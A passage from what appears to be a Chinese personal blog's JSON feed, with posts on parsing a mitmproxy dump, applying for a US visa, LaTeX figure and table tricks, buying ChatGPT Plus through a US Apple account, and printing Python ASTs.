class=\"number\">50</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">file = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">parse_dump(file)</span><br></pre></td></tr></table></figure>\n<p>执行脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 parse-mitm.py data.py</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<blockquote>\n<p align=\"center\">Mostly I just kill time,\" he said, \"and it dies hard.\"</p>\n<p align=\"right\">——Raymond Chandler 《The Long Goodbye》 </p>\n<p align=\"center\">我大抵只是消磨时间，时间却过的很慢。</p>\n<p align=\"right\">——钱德勒《漫长的告别》 </p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "https://snowroll.github.io/visa/",
            "url": "https://snowroll.github.io/visa/",
            "title": "赴美签证",
            "date_published": "2024-04-06T04:00:00.000Z",
            "content_html": "<h2 id=\"签证\"><a class=\"markdownIt-Anchor\" href=\"#签证\">#</a> 签证</h2>\n<ol>\n<li>\n<p>申请美签，首先要填写 DS160</p>\n<ul>\n<li>\n<p>签证网站： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZWFjLnN0YXRlLmdvdi9nZW5uaXYv\">https://ceac.state.gov/genniv/</span></p>\n</li>\n<li>\n<p>DS160 填写说明： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWVpbHZ0b25nLmNvbS92aWV3dGhyZWFkLnBocD90aWQ9MTkjY29udGFjdA==\">https://www.meilvtong.com/viewthread.php?tid=19#contact</span></p>\n</li>\n</ul>\n</li>\n<li>\n<p>填完 DS160，需要申请所在城市的面签，网址如下</p>\n<ul>\n<li>\n<p>签证预约网站： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwudXN0cmF2ZWxkb2NzLmNvbS8/Y291bnRyeT1DaGluYSZhbXA7bGFuZ3VhZ2U9RW5nbGlzaA==\">https://portal.ustraveldocs.com/?country=China&amp;language=English</span></p>\n</li>\n<li>\n<p>准备材料： 护照（passport），面谈预约单（Appointment），DS160 确认页（Recipt Number） ，50mm*50mm 白底签证照片。其余都非必需，建议以自己的时间情况准备</p>\n</li>\n<li>\n<p>江苏省签证服务指导建议： <span class=\"exturl\" data-url=\"aHR0cDovLzIyMS4yMjYuNjcuODYvMDE2LzIwMjMwMjAyLzBlMTdkN2VmLWExODktNGY3Mi05MGY0LWY3Mjk4ZjM1MDNiYi5odG1s\">http://221.226.67.86/016/20230202/0e17d7ef-a189-4f72-90f4-f7298f3503bb.html</span></p>\n</li>\n<li>\n<p>面签预约人很多，需要提前 1-2 个月。<strong>有 DS160 编号，即可开始申请面签</strong>，面签之前把表填完就行</p>\n</li>\n</ul>\n</li>\n<li>\n<p>面签说中英文均可，一般的问题如下</p>\n<ul>\n<li>为什么去美国？</li>\n<li>去多久？</li>\n<li>是否是第一次出国？</li>\n<li>是否有邀请信？</li>\n<li>问一下个人相关信息，毕业院校，学位，专业等等</li>\n</ul>\n</li>\n<li>\n<p>签证面签之后，可以通过下面网址查看自己的签证状况</p>\n<ul>\n<li>签证查询网址： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZWFjLnN0YXRlLmdvdi9DRUFDU3RhdFRyYWNrZXIvU3RhdHVzLmFzcHg=\">https://ceac.state.gov/CEACStatTracker/Status.aspx</span></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"出发\"><a class=\"markdownIt-Anchor\" href=\"#出发\">#</a> 出发</h2>\n<p>准备：</p>\n<ul>\n<li>一张 mastercard 或者 visa 的信用卡，美国基本都刷信用卡  pay with credit card</li>\n<li>少量现金 pay with cash</li>\n<li>护照 passport</li>\n<li>一张美国电话卡，淘宝买</li>\n</ul>\n<p>乘机：</p>\n<pre><code>1. 常用英文汇总\n - https://zhuanlan.zhihu.com/p/431899803\n - https://www.hjenglish.com/new/p1350746/\n</code></pre>\n<p>入境检查：</p>\n<ol>\n<li>常问问题\n<ul>\n<li>What’s your purpose of visiting U.S? Why are you coming to U.S?  What do you come to U.S for?</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWlmdWJhYnkuY29tL2JhaWtlU2hvdy5hc3A/aWQ9NTI0\">https://www.mifubaby.com/baikeShow.asp?id=524</span></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"到达\"><a class=\"markdownIt-Anchor\" href=\"#到达\">#</a> 到达</h2>\n<p>用蹩脚英文交流起来吧 hhh，大家还是很宽容的😂</p>\n",
            "tags": [
                "travel"
            ]
        },
        {
            "id": "https://snowroll.github.io/latex_skill/",
            "url": "https://snowroll.github.io/latex_skill/",
            "title": "Latex技巧 —— 图表操作",
            "date_published": "2024-02-03T04:00:38.000Z",
            "content_html": "<ul>\n<li>\n<p>几张图片并列</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\begin</span>&#123;figure*&#125;[htbp]</span><br><span class=\"line\"><span class=\"keyword\">\\centering</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">\\begin</span>&#123;minipage&#125;[t]&#123;0.35<span class=\"keyword\">\\textwidth</span>&#125;</span><br><span class=\"line\">  <span class=\"keyword\">\\parbox</span>[][4cm][t]&#123;<span class=\"keyword\">\\linewidth</span>&#125;&#123;</span><br><span class=\"line\">    <span class=\"keyword\">\\centering</span></span><br><span class=\"line\">    <span class=\"keyword\">\\includegraphics</span>[width=<span class=\"keyword\">\\linewidth</span>]&#123;img/1.jpeg&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">\\vspace</span>&#123;1.1cm&#125;</span><br><span class=\"line\">  <span class=\"keyword\">\\caption</span>&#123;This is Figure1.&#125;</span><br><span class=\"line\">  <span class=\"keyword\">\\label</span>&#123;Fig:r1&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\end</span>&#123;minipage&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">\\begin</span>&#123;minipage&#125;[t]&#123;0.4<span class=\"keyword\">\\textwidth</span>&#125;</span><br><span class=\"line\">  <span class=\"keyword\">\\parbox</span>[][4cm][t]&#123;<span class=\"keyword\">\\linewidth</span>&#125;&#123;</span><br><span class=\"line\">    <span class=\"keyword\">\\centering</span></span><br><span class=\"line\">    <span class=\"keyword\">\\includegraphics</span>[width=<span class=\"keyword\">\\linewidth</span>]&#123;img/2.jpeg&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">\\vspace</span>&#123;1.1cm&#125;</span><br><span class=\"line\">  <span class=\"keyword\">\\caption</span>&#123;This is Figure2.&#125; </span><br><span class=\"line\">  <span class=\"keyword\">\\label</span>&#123;Fig:r2&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\end</span>&#123;minipage&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">\\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/latex_skill/two-figure.png\" class=\"\">\n</li>\n<li>\n<p>竖排图片的间隔问题</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\vspace</span>&#123;长度&#125;：在当前行下面插入指定长度的竖直间隔</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>表格垂直居中</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\begin</span>&#123;tabular&#125;&#123;|p&#123;0.3<span class=\"keyword\">\\linewidth</span>&#125;|m&#123;0.3<span class=\"keyword\">\\linewidth</span>&#125;|b&#123;0.3<span class=\"keyword\">\\linewidth</span>&#125;|&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\hline</span></span><br><span class=\"line\"><span class=\"keyword\">\\centering</span> header p <span class=\"built_in\">&amp;</span></span><br><span class=\"line\"><span class=\"keyword\">\\centering</span> header m <span class=\"built_in\">&amp;</span>   </span><br><span class=\"line\"><span class=\"keyword\">\\centering</span> header b <span class=\"keyword\">\\tabularnewline</span></span><br><span class=\"line\"><span class=\"keyword\">\\hline</span></span><br><span class=\"line\">text which is considerably longer than the width of the column  <span class=\"built_in\">&amp;</span> </span><br><span class=\"line\">text which is considerably longer than the width of the column  <span class=\"built_in\">&amp;</span> </span><br><span class=\"line\">text which is considerably longer than the width of the column </span><br><span class=\"line\"><span class=\"keyword\">\\tabularnewline</span></span><br><span class=\"line\"><span class=\"keyword\">\\hline</span></span><br><span class=\"line\"><span class=\"keyword\">\\end</span>&#123;tabular&#125;</span><br></pre></td></tr></table></figure>\n<p>只需设置一行为 m，即可让其他行都居中</p>\n<img data-src=\"/latex_skill/table-center.png\" class=\"\">\n</li>\n<li>\n<p>表格在文中的位置</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\begin</span>&#123;table&#125;[htb]</span><br></pre></td></tr></table></figure>\n<p>h - here 即表格在文中位置</p>\n<p>t - top</p>\n<p>b - bottom</p>\n<p>[htb] 按照顺序排列进行选择</p>\n<p>其中 h 表示 here, t –top, b-bottom，即表格在文中的位置。那么 [htb] 是按照其顺序排列进行选择，即 h, t ,b 顺序。</p>\n</li>\n<li>\n<p>bib 引用注释</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 注释一行用//</span><br><span class=\"line\">@misc&#123;</span><br><span class=\"line\">  author = &quot;tt&quot;,</span><br><span class=\"line\">  //month = &quot;mar&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 注释一个引用，去掉@</span><br><span class=\"line\">misc&#123;</span><br><span class=\"line\">  author = &quot;tt&quot;,</span><br><span class=\"line\">  month = &quot;mar&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>避免因 url 过长而导致出现不必要的空格</p>\n<p>在导言区加载 <strong> <code>url</code> </strong> 宏包， 同时添加任意处可断</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\usepackage</span>&#123;url&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">\\makeatletter</span></span><br><span class=\"line\"><span class=\"keyword\">\\def</span><span class=\"keyword\">\\UrlAlphabet</span>&#123;<span class=\"comment\">%</span></span><br><span class=\"line\">      <span class=\"keyword\">\\do</span><span class=\"keyword\">\\a</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\b</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\c</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\d</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\e</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\f</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\g</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\h</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\i</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\j</span><span class=\"comment\">%</span></span><br><span class=\"line\">      <span class=\"keyword\">\\do</span><span class=\"keyword\">\\k</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\l</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\m</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\n</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\o</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\p</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\q</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\r</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\s</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\t</span><span class=\"comment\">%</span></span><br><span class=\"line\">      <span class=\"keyword\">\\do</span><span class=\"keyword\">\\u</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\v</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\w</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\x</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\y</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\z</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\A</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\B</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\C</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\D</span><span class=\"comment\">%</span></span><br><span class=\"line\">      <span class=\"keyword\">\\do</span><span class=\"keyword\">\\E</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\F</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\G</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\H</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\I</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\J</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\K</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\L</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\M</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\N</span><span class=\"comment\">%</span></span><br><span class=\"line\">      <span class=\"keyword\">\\do</span><span class=\"keyword\">\\O</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\P</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\Q</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\R</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\S</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\T</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\U</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\V</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\W</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\X</span><span class=\"comment\">%</span></span><br><span class=\"line\">      <span class=\"keyword\">\\do</span><span class=\"keyword\">\\Y</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\Z</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\def</span><span class=\"keyword\">\\UrlDigits</span>&#123;<span class=\"keyword\">\\do</span><span class=\"keyword\">\\1</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\2</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\3</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\4</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\5</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\6</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\7</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\8</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\9</span><span class=\"keyword\">\\do</span><span class=\"keyword\">\\0</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\g@addto@macro</span>&#123;<span class=\"keyword\">\\UrlBreaks</span>&#125;&#123;<span class=\"keyword\">\\UrlOrds</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\g@addto@macro</span>&#123;<span class=\"keyword\">\\UrlBreaks</span>&#125;&#123;<span class=\"keyword\">\\UrlAlphabet</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\g@addto@macro</span>&#123;<span class=\"keyword\">\\UrlBreaks</span>&#125;&#123;<span class=\"keyword\">\\UrlDigits</span>&#125;</span><br></pre></td></tr></table></figure>\n<p>在 <code>ref.bib</code>  中使用 \\url 引用网址</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\url</span>&#123;<span class=\"link\">http://www.example.com/very/long/url/that/might/cause/line/breaks</span>&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>画带截断图</p>\n<p>参考链接文章 <span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81ODg4NTgxNjU=\">https://zhuanlan.zhihu.com/p/588858165</span></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> brokenaxes <span class=\"keyword\">import</span> brokenaxes</span><br><span class=\"line\"></span><br><span class=\"line\">np.random.seed(<span class=\"number\">1289231</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置20个随机点，且均不超过0.2</span></span><br><span class=\"line\">pts = np.random.rand(<span class=\"number\">20</span>)*<span class=\"number\">.2</span>  </span><br><span class=\"line\"><span class=\"comment\"># 在2和12位置，设置两个离群点</span></span><br><span class=\"line\">pts[[<span class=\"number\">2</span>, <span class=\"number\">12</span>]] += <span class=\"number\">.8</span></span><br><span class=\"line\"></span><br><span class=\"line\">fig = plt.figure(figsize=(<span class=\"number\">8</span>,<span class=\"number\">6</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用brokenaxes函数创建绘图坐标轴体系，ylim参数中输入断点两侧轴范围，</span></span><br><span class=\"line\"><span class=\"comment\"># despine参数控制是否显示上轴和右轴，hspace参数控制断点截断线之间的宽度，d控制断点截断线的长度</span></span><br><span class=\"line\">ax = brokenaxes(ylims=((<span class=\"number\">0</span>, <span class=\"number\">0.22</span>), (<span class=\"number\">0.78</span>, <span class=\"number\">1.0</span>)),despine=<span class=\"literal\">False</span>, hspace=<span class=\"number\">0.05</span>, d=<span class=\"number\">0.01</span>)</span><br><span class=\"line\">ax.plot(pts)</span><br><span class=\"line\"><span class=\"comment\"># 设置网格线类型和透明度 &amp; 加两条虚线</span></span><br><span class=\"line\">ax.grid(ls=<span class=\"string\">&#x27;--&#x27;</span>, alpha=<span class=\"number\">0.5</span>, linewidth=<span class=\"number\">1</span>)</span><br><span class=\"line\">ax.axhline(y=<span class=\"number\">0.22</span>, color=<span class=\"string\">&#x27;black&#x27;</span>, linestyle=<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">ax.axhline(y=<span class=\"number\">0.78</span>, color=<span class=\"string\">&#x27;black&#x27;</span>, linestyle=<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<img data-src=\"/latex_skill/broken_ax.png\" class=\"\">\n</li>\n</ul>\n",
            "tags": [
                "latex"
            ]
        },
        {
            "id": "https://snowroll.github.io/chatgpt_plus/",
            "url": "https://snowroll.github.io/chatgpt_plus/",
            "title": "申请chatgpt-plus会员",
            "date_published": "2024-01-01T12:00:00.000Z",
            "content_html": "<p>chatgpt plus 申请流程</p>\n<p>通过苹果 APP Store 里面的礼品卡充值，避免要使用国外货币</p>\n<p>前提：</p>\n<ul>\n<li>有一台 iphone 或者 ipad</li>\n<li>已经拥有 chatgpt 的普通账号</li>\n</ul>\n<h2 id=\"1-申请美区苹果账号\"><a class=\"markdownIt-Anchor\" href=\"#1-申请美区苹果账号\">#</a> 1. 申请美区苹果账号</h2>\n<p>通过<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHBsZWRpLmNvbS8=\">苹果帝</span>来购买一个美区的 ios 账号，按照里面的教程操作即可。</p>\n<h2 id=\"2-获取科学工具\"><a class=\"markdownIt-Anchor\" href=\"#2-获取科学工具\">#</a> 2. 获取科学工具</h2>\n<p>我找到的一个网站<span class=\"exturl\" data-url=\"aHR0cHM6Ly92MnN4LmNvbS9pbmRleC5waHA=\"> v2sx</span>，可以正常使用。</p>\n<p><img data-src=\"/Users/chaihj15/Desktop/Master/Study/Two-Autumn/white/blog/hexo-blog/source/_posts/chatgpt_plus/vpn.png\" alt=\"image-20231216175123361\"></p>\n<p>在产品购买里，购买一个基本款就可以。具体的使用可以查看他们的帮助文档，例如 windows 下的<span class=\"exturl\" data-url=\"aHR0cHM6Ly92MnN4LmNvbS9pbmRleC5waHA/cnA9L2tub3dsZWRnZWJhc2UvNC8tV2luZG93cy0tVjJSYXktLmh0bWw=\">帮助文档</span>。</p>\n<p>IPad 和 IPhone 的所有应用都只能通过应用商店获取，而国内的应用商店无法下载这些科学工具。就需要我们上一步拿到的美区苹果账号。</p>\n<ol>\n<li>打开 App Store，点击右上角的头像，退出当前用户登陆</li>\n<li>用美区账号的用户名和密码登录</li>\n<li>下载 Shadowrocks</li>\n<li>按照<span class=\"exturl\" data-url=\"aHR0cHM6Ly92MnN4LmNvbS9pbmRleC5waHA/cnA9L2tub3dsZWRnZWJhc2UvNS8taU9TLS1WMlJheS0uaHRtbA==\">教程</span>，实现科学上网</li>\n</ol>\n<h2 id=\"3-购买礼品卡充值\"><a class=\"markdownIt-Anchor\" href=\"#3-购买礼品卡充值\">#</a> 3. 购买礼品卡充值</h2>\n<ul>\n<li>打开支付宝，搜索 PockyShop，点击进入对应小程序</li>\n<li>找到礼品卡列表里的， APP Store &amp; iTunes USA</li>\n<li>充值购买，得到一个兑换码</li>\n<li>返回 IPad 或 IPhone，点击 App Store 右上角头像，选择兑换充值卡</li>\n<li>APP Store 中下载 ChatGPT，然后在应用中升级 Chat GPT plus 即可</li>\n</ul>\n",
            "tags": [
                "chatgpt"
            ]
        },
        {
            "id": "https://snowroll.github.io/python_ast/",
            "url": "https://snowroll.github.io/python_ast/",
            "title": "Python代码AST解析",
            "date_published": "2023-08-31T15:16:53.000Z",
            "content_html": "<h1 id=\"ast解析\"><a class=\"markdownIt-Anchor\" href=\"#ast解析\">#</a> AST 解析</h1>\n<p>抽象语法树（AST）可以帮助我们更好地处理 python 的源码，是静态分析中常用的工具。下面让我们一起来看看如何利用 AST 来处理 python 源码。</p>\n<h2 id=\"获取源码ast\"><a class=\"markdownIt-Anchor\" href=\"#获取源码ast\">#</a> 获取源码 AST</h2>\n<p>首先，我们来处理一个简单的 python 语句 <code>print('hello!')</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"><span class=\"keyword\">from</span> astpretty <span class=\"keyword\">import</span> pprint</span><br><span class=\"line\"></span><br><span class=\"line\">source_code = <span class=\"string\">&quot;print(&#x27;hello!&#x27;)&quot;</span></span><br><span class=\"line\">abstract_tree = ast.parse(source_code)</span><br><span class=\"line\">pprint(abstract_tree)</span><br></pre></td></tr></table></figure>\n<p><code>print('hello!')</code>  的 AST 如下所示</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Module(</span><br><span class=\"line\">    body=[</span><br><span class=\"line\">        Expr(</span><br><span class=\"line\">            lineno=1,</span><br><span class=\"line\">            col_offset=0,</span><br><span class=\"line\">            value=Call(</span><br><span class=\"line\">                lineno=1,</span><br><span class=\"line\">                col_offset=0,</span><br><span class=\"line\">                func=Name(lineno=1, col_offset=0, id=<span class=\"string\">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class=\"line\">                args=[Str(lineno=1, col_offset=6, s=<span class=\"string\">&#x27;hello!&#x27;</span>)],</span><br><span class=\"line\">                keywords=[],</span><br><span class=\"line\">            ),</span><br><span class=\"line\">        ),</span><br><span class=\"line\">    ],</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>如上所示，就是一个简单的 python 代码的 AST 表示。</p>\n<p>更多关于 AST 语法相关的内容可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L2FzdC5odG1s\">【官方文档】</span>。</p>\n<h2 id=\"遍历ast节点\"><a class=\"markdownIt-Anchor\" href=\"#遍历ast节点\">#</a> 遍历 AST 节点</h2>\n<p>得到 AST 表示显然不是我们的最终目的，我们想要能够借助 AST 来获取更多信息。</p>\n<p>举个例子，我们想要获取 python 源码中所有函数定义的名称。下面我们就开始探索一下，如何利用 AST 来达成我们的目的。</p>\n<p><code>sample.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">foo</span>():</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;func foo&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>利用上述方法我们可以得到 <code>sample.py</code>  的 AST 表示，如下。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Module(</span><br><span class=\"line\">    body=[</span><br><span class=\"line\">        FunctionDef(</span><br><span class=\"line\">            lineno=1,</span><br><span class=\"line\">            col_offset=0,</span><br><span class=\"line\">            name=<span class=\"string\">&#x27;foo&#x27;</span>,</span><br><span class=\"line\">            args=arguments(args=[], vararg=None, kwonlyargs=[], kw_defaults=[], kwarg=None, defaults=[]),</span><br><span class=\"line\">            body=[</span><br><span class=\"line\">                Expr(</span><br><span class=\"line\">                    lineno=2,</span><br><span class=\"line\">                    col_offset=4,</span><br><span class=\"line\">                    value=Call(</span><br><span class=\"line\">                        lineno=2,</span><br><span class=\"line\">                        col_offset=4,</span><br><span class=\"line\">                        func=Name(lineno=2, col_offset=4, id=<span class=\"string\">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class=\"line\">                        args=[Str(lineno=2, col_offset=10, s=<span class=\"string\">&#x27;func foo&#x27;</span>)],</span><br><span class=\"line\">                        keywords=[],</span><br><span class=\"line\">                    ),</span><br><span class=\"line\">                ),</span><br><span class=\"line\">            ],</span><br><span 